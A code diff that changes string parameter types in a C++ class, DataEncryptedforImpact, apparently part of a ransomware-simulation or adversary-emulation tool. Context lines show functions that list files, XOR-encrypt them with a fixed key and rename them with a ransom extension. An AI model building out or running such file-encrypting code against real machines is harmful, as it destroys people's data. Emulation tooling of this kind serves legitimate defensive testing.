@@ -24,7 +24,7 @@ namespace win {
 		return true;
 	}
 
-	DWORD DataEncryptedforImpact::RansomeData(std::wstring_view target_path)
+	DWORD DataEncryptedforImpact::RansomeData(const std::wstring& target_path)
 	{
 		DWORD result = ERROR_SUCCESS;
 		std::vector<std::wstring> txtFiles;
@@ -38,7 +38,7 @@ namespace win {
 		return result;
 	}
 
-	std::wstring DataEncryptedforImpact::ChangeFilenameExtensionForEncrypt(std::wstring_view target_file_path){
+	std::wstring DataEncryptedforImpact::ChangeFilenameExtensionForEncrypt(const std::wstring& target_file_path){
 		std::wstring new_path(target_file_path);
 		std::wstring ransome_extension = L"pp";
 
@@ -47,7 +47,7 @@ namespace win {
 		return new_path;
 	}
 
-	DWORD DataEncryptedforImpact::EncryptFileData(std::wstring_view target_file_path){
+	DWORD DataEncryptedforImpact::EncryptFileData(const std::wstring& target_file_path){
 		char key = 0x6;
 		DWORD buffer_size = 0;
 		HANDLE target_file_handle = nullptr;
@@ -100,7 +100,7 @@ namespace win {
 		return lookupTable.find(file_name) != lookupTable.end();
 	}
 
-	DWORD DataEncryptedforImpact::GetFileList(std::wstring_view path, std::vector<std::wstring>* text_files){
+	DWORD DataEncryptedforImpact::GetFileList(const std::wstring& path, std::vector<std::wstring>* text_files){
 		WIN32_FIND_DATA find_data;
 		HANDLE file_handle;
 
